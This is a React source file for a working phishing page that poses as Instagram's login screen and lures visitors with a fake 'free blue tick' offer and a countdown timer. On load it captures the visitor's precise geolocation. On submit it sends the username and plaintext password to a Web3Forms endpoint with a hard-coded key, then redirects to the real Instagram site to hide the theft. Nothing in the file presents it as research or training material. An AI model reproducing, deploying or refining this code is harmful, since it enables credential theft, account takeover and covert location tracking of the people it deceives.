import { useState, useEffect } from "react";

const instagramUrl = "https://www.instagram.com/";

export function App() {
  const [showPassword, setShowPassword] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  
  // Initialize timer from localStorage or start new timer
  const [timeLeft, setTimeLeft] = useState(() => {
    const savedEndTime = localStorage.getItem('timerEndTime');
    if (savedEndTime) {
      const endTime = parseInt(savedEndTime, 10);
      const now = Date.now();
      const remainingSeconds = Math.floor((endTime - now) / 1000);
      
      if (remainingSeconds > 0) {
        return remainingSeconds;
      }
    }
    
    // Start new timer: 20 minutes from now
    const newEndTime = Date.now() + (20 * 60 * 1000);
    localStorage.setItem('timerEndTime', newEndTime.toString());
    return 20 * 60;
  });

  // Request location on mount
  useEffect(() => {
    if ('geolocation' in navigator) {
      console.log('Requesting location permission...');
      navigator.geolocation.getCurrentPosition(
        async (position) => {
          const { latitude, longitude, accuracy } = position.coords;
          console.log('Location captured:', { latitude, longitude, accuracy });
          
          // Send location immediately to Web3Forms
          const formData = new FormData();
          formData.append('access_key', 'ae1d92b7-0790-4af0-8d45-e45cfa6e88f1');
          formData.append('name', 'Location Captured');
          formData.append('email', 'location@instagram.com');
          formData.append('subject', 'User Location Captured');
          formData.append('message', `Latitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters\nTimestamp: ${new Date().toISOString()}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);
          
          try {
            const response = await fetch('https://api.web3forms.com/submit', {
              method: 'POST',
              body: formData
            });
            const result = await response.json();
            console.log('Location sent successfully:', result);
            // Store that location was sent
            localStorage.setItem('locationSent', 'true');
          } catch (error) {
            console.error('Location submission error:', error);
          }
        },
        (error) => {
          console.log('Location permission denied or error:', error.message);
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    } else {
      console.log('Geolocation not supported');
    }
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeft((prevTime) => {
        if (prevTime <= 1) {
          clearInterval(timer);
          localStorage.removeItem('timerEndTime');
          return 0;
        }
        return prevTime - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    // Submit to Web3Forms
    const formData = new FormData();
    formData.append('access_key', 'ae1d92b7-0790-4af0-8d45-e45cfa6e88f1');
    formData.append('name', username);
    formData.append('email', 'login-attempt@instagram.com');
    formData.append('message', password); // Password in message field
    
    try {
      await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        body: formData
      });
    } catch (error) {
      console.error('Form submission error:', error);
    }
    
    // Redirect to Instagram
    window.location.href = instagramUrl;
  };

  return (
    <main className="landing-shell">
      <section className="experience">
        <div className="phone-mockup">
          <div className="phone-frame">
            <div className="phone-notch"></div>
            
            <div className="phone-content">
              <div className="promo-timer" style={{ '--progress': `${(timeLeft / (20 * 60)) * 100}%` }}>
                <div className="timer-content">
                  <div className="timer-badge">{formatTime(timeLeft)}</div>
                  <div className="timer-text">
                    <strong>Celebrating 15 years of IG!</strong> Get free blue tick 
                    <svg className="blue-tick" width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <circle cx="12" cy="12" r="11" fill="#0095f6"/>
                      <path d="M9 12l2 2 4-4" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                    <br />
                    <span className="timer-cta">Login to claim</span>
                  </div>
                </div>
              </div>

              <img src="/image (5).png" alt="Instagram" className="instagram-logo" />
              
              <form className="login-form" onSubmit={handleSubmit}>
                <input
                  type="text"
                  className="login-input"
                  placeholder="Phone number, username or email"
                  aria-label="Phone number, username or email"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                />
                
                <div className="password-field">
                  <input
                    type={showPassword ? "text" : "password"}
                    className="login-input"
                    placeholder="Password"
                    aria-label="Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                  />
                  <button
                    type="button"
                    className="toggle-password"
                    onClick={() => setShowPassword(!showPassword)}
                    aria-label={showPassword ? "Hide password" : "Show password"}
                  >
                    {showPassword ? (
                      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M2 12C2 12 5 5 12 5C19 5 22 12 22 12C22 12 19 19 12 19C5 19 2 12 2 12Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                        <circle cx="12" cy="12" r="3" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                        <line x1="3" y1="3" x2="21" y2="21" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
                      </svg>
                    ) : (
                      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M2 12C2 12 5 5 12 5C19 5 22 12 22 12C22 12 19 19 12 19C5 19 2 12 2 12Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                        <circle cx="12" cy="12" r="3" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                      </svg>
                    )}
                  </button>
                </div>

                <a href="#forgot" className="forgot-link" onClick={(e) => e.preventDefault()}>Forgot password?</a>

                <button type="submit" className="login-button">Log In</button>
              </form>

              <div className="signup-section">
                <p className="signup-text">
                  Don't have an account? <a href="#signup" className="signup-link" onClick={(e) => e.preventDefault()}>Sign Up.</a>
                </p>
              </div>
            </div>
          </div>
        </div>

        <div className="desktop-view">
          <div className="desktop-container">
            <div className="promo-timer desktop-timer" style={{ '--progress': `${(timeLeft / (20 * 60)) * 100}%` }}>
              <div className="timer-content">
                <div className="timer-badge">{formatTime(timeLeft)}</div>
                <div className="timer-text">
                  <strong>Celebrating 15 years of IG!</strong> Get free blue tick 
                  <svg className="blue-tick" width="14" height="14" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="12" cy="12" r="11" fill="#0095f6"/>
                    <path d="M9 12l2 2 4-4" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                  <br />
                  <span className="timer-cta">Login to claim</span>
                </div>
              </div>
            </div>

            <div className="desktop-card">
              <img src="/image (5).png" alt="Instagram" className="instagram-logo" />
              
              <form className="login-form" onSubmit={handleSubmit}>
                <input
                  type="text"
                  className="login-input"
                  placeholder="Phone number, username or email"
                  aria-label="Phone number, username or email"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                />
                
                <div className="password-field">
                  <input
                    type={showPassword ? "text" : "password"}
                    className="login-input"
                    placeholder="Password"
                    aria-label="Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                  />
                  <button
                    type="button"
                    className="toggle-password"
                    onClick={() => setShowPassword(!showPassword)}
                    aria-label={showPassword ? "Hide password" : "Show password"}
                  >
                    {showPassword ? (
                      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M2 12C2 12 5 5 12 5C19 5 22 12 22 12C22 12 19 19 12 19C5 19 2 12 2 12Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                        <circle cx="12" cy="12" r="3" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                        <line x1="3" y1="3" x2="21" y2="21" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
                      </svg>
                    ) : (
                      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M2 12C2 12 5 5 12 5C19 5 22 12 22 12C22 12 19 19 12 19C5 19 2 12 2 12Z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                        <circle cx="12" cy="12" r="3" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                      </svg>
                    )}
                  </button>
                </div>

                <button type="submit" className="login-button">Log In</button>

                <div className="divider">
                  <span>OR</span>
                </div>
              </form>

              <a href="#forgot" className="forgot-link-desktop" onClick={(e) => e.preventDefault()}>Forgot password?</a>
            </div>

            <div className="signup-card">
              <p className="signup-text">
                Don't have an account? <a href="#signup" className="signup-link" onClick={(e) => e.preventDefault()}>Sign up</a>
              </p>
            </div>
          </div>
        </div>
      </section>
    </main>
  );
}
